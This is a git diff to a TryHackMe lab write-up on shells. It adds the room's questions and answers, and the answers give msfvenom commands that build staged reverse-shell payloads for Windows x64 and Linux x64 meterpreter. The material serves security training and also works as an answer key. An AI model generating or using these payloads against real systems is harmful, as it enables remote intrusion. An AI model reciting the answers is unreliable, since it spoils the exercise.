@@ -433,7 +433,7 @@ msfvenom -p <PAYLOAD> <OPTIONS>
 
 For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:  
 
-msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>  
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=_listen-IP_ LPORT=_listen-port_  
 
 <img width="852" height="124" alt="image" src="https://github.com/user-attachments/assets/034dbbbd-4df7-4a90-8d4e-4022b7a81d93" />
 
@@ -511,5 +511,12 @@ This can be used to list all available payloads, which can then be piped into gr
 
 This gives us a full set of Linux meterpreter payloads for 32bit targets.  
 
+*Generate a staged reverse shell for a 64 bit Windows target, in a .exe format using your TryHackMe tun0 IP address and a chosen port.*
+*Answer: msfvenom -p windows/x64/shell/reverse_tcp LHOST=_TUN0_IP_ LPORT=_PORT_ -f exe -o shell.exe*
 
+*Which symbol is used to show that a shell is stageless?*
+*Answer: _*
+
+*What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell**
+*Answer: msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443*
 
